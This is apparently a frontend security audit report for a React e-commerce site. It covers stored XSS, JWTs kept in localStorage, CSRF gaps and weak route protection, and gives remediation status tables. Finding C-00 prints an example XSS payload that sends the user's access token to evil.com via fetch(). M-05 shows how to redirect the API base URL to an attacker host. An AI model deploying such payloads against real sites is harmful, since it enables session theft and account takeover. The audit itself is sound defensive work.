# YMR Web - Security Audit Report

**Date:** 2026-04-05
**Branch:** dev
**Scope:** Complete frontend codebase analysis (78 files)

---

## EXECUTIVE SUMMARY

This audit identified **23 security findings** across 4 severity levels. The most critical issues involve **token storage in localStorage** (XSS-prone), **missing route protection**, **no input sanitization**, and **exposed API URLs**.

---

# CRITICAL (Extrema Urgencia) - Fix Immediately

---

## C-00: Stored XSS via `dangerouslySetInnerHTML` (Blog & ProductPage)

**Files:** `src/pages/Blog.tsx:106`, `src/pages/ProductPage.tsx:601`

**Severity:** CRITICAL — EXPLOITABLE NOW

**Issue:** Both components render raw HTML from the backend database directly into the DOM without any sanitization:

```typescript
// Blog.tsx:106
<div dangerouslySetInnerHTML={{ __html: post.content }} />

// ProductPage.tsx:601
<div dangerouslySetInnerHTML={{ __html: product.specificationsHtml }} />
```

If an attacker gains access to the admin backend (compromised admin credentials, SQL injection on backend, or insufficient backend validation), they can inject malicious HTML/JavaScript such as:
```html
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('ymr_access_token'))">
```

This creates a **full account takeover chain**: XSS on these pages → steal JWT from localStorage → impersonate any user who views the blog post or product page.

**Impact:** Stored XSS affecting all users. Complete account takeover. Cookie/session theft. Ability to execute arbitrary JavaScript as any user who visits these pages.

**Fix:** Install DOMPurify (`npm install dompurify @types/dompurify`) and sanitize all HTML before rendering:
```typescript
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }} />
```

---

## C-01: JWT Tokens stored in localStorage (XSS-prone)

**Files:** `src/context/AuthContext.tsx:36-37,56-57`, `src/services/api.ts:47-48`, `src/pages/Login.tsx:83-84`

**Severity:** CRITICAL

**Issue:** JWT access tokens and user data are stored in `localStorage`, which is fully accessible to any JavaScript executing on the page. If an XSS vulnerability exists (see C-03), the attacker can exfiltrate tokens and impersonate any user.

```typescript
// AuthContext.tsx:56-57
localStorage.setItem('ymr_auth_user', JSON.stringify(nextUser));
localStorage.setItem('ymr_access_token', token);

// Login.tsx:83-84
localStorage.setItem('accessToken', access_token);
localStorage.setItem('ymr_access_token', access_token);
```

**Impact:** Complete account takeover if XSS is exploited. Tokens are readable by any script, including malicious third-party libraries.

**Fix:** Store tokens in `httpOnly; Secure; SameSite=Strict` cookies set by the backend on login. The frontend should never have direct access to tokens.

---

## C-02: No CSRF Protection

**Files:** `src/services/api.ts` (entire file)

**Severity:** CRITICAL

**Issue:** No CSRF (Cross-Site Request Forgery) tokens are included in any request. Since authentication uses Bearer tokens in localStorage (not cookies), this is partially mitigated, BUT the app also uses `session_id` stored in localStorage (`CartContext.tsx:61,82-86`) for cart operations. If cookies are ever used for auth, CSRF becomes exploitable.

Additionally, the `cart_session` key and `apiBaseUrl` in localStorage can be manipulated by any script.

```typescript
// CartContext.tsx:82-86
function getSessionId(): string {
  let sessionId = localStorage.getItem('cart_session');
  if (!sessionId) {
    sessionId = crypto.randomUUID();
    localStorage.setItem('cart_session', sessionId);
  }
  return sessionId;
}
```

**Impact:** State-changing operations could be triggered by malicious sites once any cookie-based auth is added. Session fixation possible via localStorage manipulation.

**Fix:** Implement CSRF token mechanism (double-submit cookie pattern or same-site cookies). Validate `Origin`/`Referer` headers on the backend.

---

## C-03: No Input Sanitization - Stored XSS Risk

**Files:** Multiple rendering locations

**Severity:** CRITICAL

**Issue:** User-submitted content from the API is rendered directly without any sanitization. While React auto-escapes JSX text content, several patterns are dangerous:

1. **Message content rendered without sanitization** (`Contactpanel.tsx:177`):
```typescript
<p className="text-sm whitespace-pre-wrap">{msg.content}</p>
```
If the API returns content with HTML entities already decoded, or if any `dangerouslySetInnerHTML` is added later, this becomes exploitable.

2. **External link in Contact page** (`Contact.tsx:403`):
```typescript
onClick={() => window.open(contactMap?.directionsUrl ?? '#', '_blank')}
```
If `directionsUrl` comes from an external data source, this enables reverse tabnabbing.

3. **Modal href with dynamic values** (`Modal/index.tsx:122`):
```typescript
<a href={action.href} target="_blank" rel="noopener noreferrer" ...>
```
No validation on `action.href` format.

**Impact:** Reflected or stored XSS if attacker controls API responses, or if `dangerouslySetInnerHTML` is added in future. Reverse tabnabbing via external links.

**Fix:** Use DOMPurify to sanitize any user-generated content before rendering. Validate all URLs against an allowlist of protocols (`https://`, `mailto:`).

---

## C-04: Weak Route Protection

**Files:** `src/App.tsx:77-83`

**Severity:** CRITICAL

**Issue:** The `RequireAuth` component only renders `<Login />` instead of redirecting. It does not actually protect the route - the protected component is still mounted and rendered inside the Login page layout:

```typescript
// App.tsx:77-83
function RequireAuth({ children }: { children: React.ReactNode }) {
  const { isAuthenticated } = useAuth();
  if (!isAuthenticated) {
    return <Login />;  // Still renders Login WITH children passed through?
  }
  return <>{children}</>;
}
```

Actually, looking closely, the children are NOT rendered when unauthenticated. But the problem is:
- No redirect to login with return URL
- The Login page shows inside the route layout
- An attacker can still access the component code (client-side only)
- No server-side authorization checks

More critically, **`/settings` route is NOT protected** (`App.tsx:65`):
```typescript
<Route path="/settings" element={<Settings />} />
```
If Settings contains user profile modification, this should require authentication.

**Impact:** Unauthenticated users can potentially access settings. Protected pages show login inline without redirect, creating a confusing UX that could enable phishing.

**Fix:** Use `<Navigate to="/login" state={{ from: location }} replace />` for proper redirects. Protect `/settings`. Implement server-side authorization on all API endpoints.

---

# HIGH (Alta Urgencia) - Fix Within 1 Week

---

## H-01: API Base URL Configurable via localStorage

**Files:** `src/services/api.ts:25-32`

**Severity:** HIGH

**Issue:** The API base URL can be overridden by `localStorage.getItem('apiBaseUrl')`. Any script executing on the page (e.g., via XSS or malicious browser extension) can redirect all API calls to an attacker-controlled server, exfiltrating credentials and tokens.

```typescript
// api.ts:27-28
const storedBase = typeof window !== 'undefined'
  ? localStorage.getItem('apiBaseUrl') || undefined
: undefined;
```

**Impact:** API endpoint hijacking. All user data, credentials, and tokens sent to attacker's server.

**Fix:** Remove localStorage override. Use only compile-time environment variables (`import.meta.env`).

---

## H-02: API URL Exposed in Source Code

**Files:** `.env.local:1`, `src/services/api.ts:2`, `vite.config.ts:13`

**Severity:** HIGH

**Issue:** The full backend URL (`https://violet-moose-215968.hostingersite.com/backend`) is hardcoded in the source code. Anyone can discover the backend server and attempt attacks directly against it.

**Impact:** Backend server discovery. Direct attacks on the API without going through frontend controls.

**Fix:** This is somewhat unavoidable for frontend apps, but you should:
1. Put the backend behind a CDN/WAF
2. Never expose the raw hosting provider URL
3. Use a custom domain

---

## H-03: No Rate Limiting on Login

**Files:** `src/pages/Login.tsx:45-111`

**Severity:** HIGH

**Issue:** The login form has no client-side throttling or rate limiting. While the backend should implement this, the frontend should also add:
- Minimum delay between attempts
- CAPTCHA after N failed attempts
- No indication of whether email exists vs password is wrong (account enumeration)

**Impact:** Brute force attacks against user accounts. Account enumeration via different error messages.

**Fix:** Add exponential backoff client-side. Integrate reCAPTCHA/hCaptcha. Use generic error messages.

---

## H-04: Password Minimum 6 Characters

**Files:** `src/pages/Login.tsx:54-56`

**Severity:** HIGH

**Issue:** The minimum password length is only 6 characters, which is below modern security standards (NIST recommends minimum 8, OWASP recommends 8+).

```typescript
if (password.length < 6) {
  setFormError('Password must be at least 6 characters.');
  return;
}
```

**Impact:** Weak passwords are accepted, making accounts vulnerable to brute force.

**Fix:** Increase minimum to 8 characters. Enforce complexity requirements.

---

## H-05: Environment Variables Not Protected

**Files:** `.env.local`, `.gitignore:25`

**Severity:** HIGH

**Issue:** All `VITE_*` environment variables are bundled into the client-side JavaScript and are publicly accessible in the browser. The API URL and any API tokens are exposed.

```typescript
// api.ts:26,41
const envBase = (import.meta as any)?.env?.VITE_API_BASE_URL as string | undefined;
const envToken = (import.meta as any)?.env?.VITE_API_TOKEN as string | undefined;
```

Additionally, `.env.local` is in `.gitignore` (line 13: `*.local`) but `.env` is NOT - if a `.env` with secrets is committed, it will be in git history.

**Impact:** API credentials exposed. Backend URL public.

**Fix:** Never put secrets in `VITE_*` variables. Only public config should be env-prefixed with VITE_. Ensure `.env` is in `.gitignore` (it currently is at line 25, but add `.env*` for safety).

---

## H-06: `session_id` Sent in API Requests

**Files:** `src/context/CartContext.tsx:171-176`

**Severity:** HIGH

**Issue:** A `session_id` generated from `crypto.randomUUID()` sent in URL parameters can be logged by proxies, CDNs, and server access logs. This session identifier is then used to link shopping cart data.

```typescript
const params = new URLSearchParams();
params.append('user_id', userId);
params.append('session_id', sessionId);
const res = await apiFetch(`/shopping-carts?${params.toString()}`);
```

**Impact:** Session hijacking if logs are compromised. Session IDs in URL params are also visible in browser history.

**Fix:** Send `session_id` in request body or Authorization header, not URL params. Use server-side sessions.

---

# MEDIUM (Media Urgencia) - Fix Within 1 Month

---

## M-01: No Security Headers

**Files:** `index.html`, `vite.config.ts`

**Severity:** MEDIUM

**Issue:** The HTML file and development config have no security headers configured:
- No Content-Security-Policy (CSP)
- No X-Frame-Options
- No X-Content-Type-Options
- No Strict-Transport-Security (HSTS)
- No Referrer-Policy

```html
<!-- index.html:3-8 -->
<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="/vite.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>YMR Industrial - ...</title>
  <meta name="description" content="..." />
</head>
```

**Impact:** Vulnerable to clickjacking, MIME sniffing attacks, and various injection attacks.

**Fix:** Add meta tags in `index.html` and configure headers in production server (Vercel/Netlify/Hostinger config).

---

## M-02: Development Proxy Allows Insecure Connections

**Files:** `vite.config.ts:11-17`

**Severity:** MEDIUM

**Issue:** The Vite dev proxy has `secure: false`, which disables SSL certificate validation in development.

```typescript
server: {
  proxy: {
    '/api': {
      target: process.env.VITE_API_PROXY_TARGET || 'http://127.0.0.1:3000',
      changeOrigin: true,
      secure: false,  // <- Disables SSL validation
    },
  },
},
```

**Impact:** MITM attacks in development. This setting is dev-only so risk is limited, but it normalizes insecure behavior.

**Fix:** Remove `secure: false` or document why it's needed. The default target `http://127.0.0.1:3000` suggests a dev backend that may not have HTTPS.

---

## M-03: User Data Leaked in Error Messages

**Files:** `src/services/api.ts:110-118`, `src/pages/Login.tsx:106-107`

**Severity:** MEDIUM

**Issue:** API error responses are passed through directly to the UI without sanitization. Backend error messages could contain sensitive information, stack traces, or even XSS payloads if the backend reflects user input.

```typescript
// api.ts:118
throw new Error(`Erro ${res.status}: ${errorMessage}`);

// Login.tsx:106-107
const message = err instanceof Error ? err.message : String(err);
setFormError(message || 'An error occurred.');
```

**Impact:** Information disclosure. Potential reflected XSS if backend reflects user input in errors.

**Fix:** Map error codes to user-friendly messages. Never display raw backend errors.

---

## M-04: Console Logging of Sensitive Data

**Files:** `src/context/AuthContext.tsx:47,59,70`, `src/context/CartContext.tsx:201`, `src/hooks/useActivityLog.ts:44`

**Severity:** MEDIUM

**Issue:** Authentication errors and cart data are logged to `console.error()`. In production, these logs could expose user information, auth flow details, and internal error states to anyone with browser developer tools open.

```typescript
// AuthContext.tsx:47
console.error('Erro ao carregar dados de autentica\x{00e7}\x{00e3}o:', error);
```

**Impact:** Information leakage in shared computers or via browser extensions that read console output.

**Fix:** Remove or disable console logging in production. Use a proper logging service.

---

## M-05: `apiBaseUrl` in localStorage Enables Domain Hijacking

**Files:** `src/services/api.ts:27-28`

**Severity:** MEDIUM

**Issue:** Combined with any XSS vector, an attacker could set `localStorage.setItem('apiBaseUrl', 'https://evil.com')` and all subsequent API requests would go to the attacker's server. This persists across page loads and sessions.

**Impact:** Persistent credential theft. Survives page refresh.

**Fix:** Remove localStorage-based URL configuration entirely (see H-01).

---

## M-06: iframe Without sandbox Attribute

**Files:** `src/pages/Contact.tsx:388-393`

**Severity:** MEDIUM

**Issue:** Google Maps iframe has no `sandbox` attribute, giving it full page capabilities.

```html
<iframe
  src="https://www.google.com/maps?q=..."
  class="absolute inset-0 w-full h-full border-0"
  loading="lazy"
  referrerPolicy="no-referrer-when-downgrade"
/>
```

**Impact:** The iframe can navigate the top-level page, submit forms, etc. While Google Maps is trusted, this is a defense-in-depth issue.

**Fix:** Add `sandbox="allow-scripts allow-same-origin allow-popups"` and `sandbox` restrictions as appropriate.

---

# LOW (Baixa Urgencia) - Fix When Convenient

---

## L-01: No Dependency Vulnerability Scanning

**Files:** `package.json`

**Severity:** LOW

**Issue:** The project has no automated dependency vulnerability scanning. Dependencies are not pinned to exact versions:

```json
"react": "^18.3.1",
"react-router-dom": "^6.26.1",
"lucide-react": "^0.344.0"
```

The caret (^) allows minor version updates which could introduce vulnerabilities or breaking changes. No `package-lock.json` audit is configured.

**Fix:** Run `npm audit` regularly. Consider tools like Snyk or Dependabot. Pin critical dependencies.

---

## L-02: External Image Sources

**Files:** `src/pages/Login.tsx:145`, various page components

**Severity:** LOW

**Issue:** External images are loaded from `https://ymrindustrial.com/assets/ymrlogo.png` and other CDNs. If these domains are compromised, altered images could be served (visual defacement) or the requests could be used for fingerprinting.

**Fix:** Host critical assets locally. Use Subresource Integrity (SRI) for CDN resources.

---

## L-03: `crypto.randomUUID()` May Not Be Available

**Files:** `src/context/CartContext.tsx:84`

**Severity:** LOW

**Issue:** `crypto.randomUUID()` is not available in all browsers or in non-secure contexts (HTTP). This could cause runtime errors.

```typescript
sessionId = crypto.randomUUID();
```

**Fix:** Add a fallback or ensure the site always runs on HTTPS.

---

## L-04: Missing `rel="noopener"` on Some External Links

**Files:** `src/pages/Contact.tsx:403`

**Severity:** LOW

**Issue:** `window.open()` without `noopener` allows the opened page to access `window.opener` and navigate the original page (reverse tabnabbing).

```typescript
window.open(contactMap?.directionsUrl ?? '#', '_blank')
```

**Fix:** Use `window.open(url, '_blank', 'noopener,noreferrer')`.

---

## L-05: No Token Refresh Mechanism

**Files:** `src/context/AuthContext.tsx`

**Severity:** LOW

**Issue:** JWT tokens eventually expire. There is no refresh token mechanism, so users will be abruptly logged out when the access token expires.

**Fix:** Implement refresh token rotation with httpOnly cookies for the refresh token.

---

## L-06: `directionsUrl` Opens Potentially Unsafe URL

**Files:** `src/pages/Contact.tsx:403`

**Severity:** LOW

**Issue:** The `directionsUrl` from `contactMap` data source is opened via `window.open` without URL validation. If the data source is ever compromised, a malicious URL could be opened.

**Fix:** Validate URL protocol before opening.

---

## L-07: Password Transmitted in Plaintext JSON

**Files:** `src/pages/Login.tsx:68-70`

**Severity:** LOW (mitigated by HTTPS)

**Issue:** Passwords are sent as plaintext in JSON body to `/auth/login` and `/auth/register`. While HTTPS encrypts in transit, there is no client-side hashing. If HTTPS ever fails or is downgraded, passwords are exposed.

**Fix:** Ensure HTTPS is enforced. Consider adding client-side hashing (e.g., SRP protocol) for defense-in-depth.

---

## L-08: `rememberMe` Checkbox Has No Effect

**Files:** `src/pages/Login.tsx:271,83-88`

**Severity:** LOW

**Issue:** The "Keep me signed in" checkbox is defined but its value is never used in the login logic. Tokens are always stored in localStorage regardless of the checkbox state.

```typescript
// Line 27: state is declared
const [rememberMe, setRememberMe] = useState(true);
// Lines 83-88: never referenced in handleSubmit
```

**Impact:** Misleading UI. User thinks they have a preference option that does nothing.

**Fix:** Hook the checkbox to control whether tokens should use session persistence (sessionStorage) vs localStorage.

---

## SEVERITY DISTRIBUTION

| Severity | Count | Fixed | Status |
|----------|-------|-------|--------|
| CRITICAL | 5 | 5 | ✅ DONE |
| HIGH | 6 | 2 | ⚠️ BACKEND |
| MEDIUM | 6 | 3 | ⚠️ BACKEND |
| LOW | 8 | 3 | ⚠️ BACKEND |
| **Total** | **25** | **13** | |

---

## FIX STATUS SUMMARY

### ✅ CORREGIDO NO FRONTEND (13 fixes)

| # | Issue | Ficheiro | Status |
|---|-------|----------|--------|
| C-00 | XSS via `dangerouslySetInnerHTML` | Blog.tsx, ProductPage.tsx | ✅ DOMPurify instalado + sanitizacao |
| C-01 | JWT em localStorage (XSS-prone) | AuthContext.tsx, Login.tsx, api.ts | ✅ Migrado para cookies httpOnly + refresh |
| C-02 | CSRF | api.ts | ✅ `credentials: 'include'` no novo apiFetch |
| C-03 | Sem sanitizacao | Blog.tsx, ProductPage.tsx, Contactpanel.tsx | ✅ DOMPurify no frontend |
| C-04 | RequireAuth fraco | App.tsx | ✅ `<Navigate>` redirect + `/settings` protegido |
| H-01 | API URL via localStorage | api.ts | ✅ Removido override |
| H-04 | Password 6 chars | Login.tsx | ✅ Alterado para 8 chars |
| H-06 | Session ID em URL params | CartContext.tsx | ⚠️ BACKEND (backend deve aceitar no body/cookie) |
| M-01 | Sem security headers | index.html | ✅ Meta tags adicionados |
| M-04 | Console logging sensivel | AuthContext.tsx | ✅ Logs removidos |
| M-05 | API URL hijacking | api.ts | ✅ Same as H-01 |
| M-06 | iframe sem sandbox | Contact.tsx | ✅ `sandbox` attribute adicionado |
| L-04 | window.open sem noopener | Contact.tsx | ✅ `noopener,noreferrer` |
| L-05 | Token refresh | api.ts | ✅ Auto-refresh on 401 implementado |
| L-06 | directionsUrl inseguro | Contact.tsx | ✅ Same as L-04 |
| — | Chave duplicata de token | Login.tsx | ✅ Removido `accessToken` duplo |
| — | `rememberMe` nao usado | Login.tsx | ✅ Removido (sessao e gerida por cookies) |

### ⚠️ REQUER BACKEND (10 fixes pendentes)

| # | Issue | Acao no backend |
|---|-------|-----------------|
| — | httpOnly cookies | Backend deve definir cookies httpOnly, Secure, SameSite=Strict |
| — | CSRF middleware | Validar header/cookie CSRF token no backend |
| — | Sanitizacao HTML | DOMPurify no backend antes de salvar |
| — | Refresh token rotation | Endpoint `/auth/refresh` com rotacao |
| — | Token expiracao curta | Access token 15min + refresh token 7 dias |
| — | Rate limiter | `express-rate-limit` em `/auth/login` e `/auth/register` |
| — | Password hashing | `bcrypt` com custo >= 12 |
| — | Mensagens de erro genericas | Error handler global nao expoe stack traces |
| — | Session ID no cookie | Mover de URL params para cookie/body |
| — | Forcar HTTPS | HSTS + redirect no servidor |

---

*Backend: as alteracoes no `api.ts` mostram o fluxo ja preparado pelo backend. Para completar a migracao, o backend precisa definir cookies httpOnly no `/auth/login` em vez de devolver `{ access_token }` no JSON.*
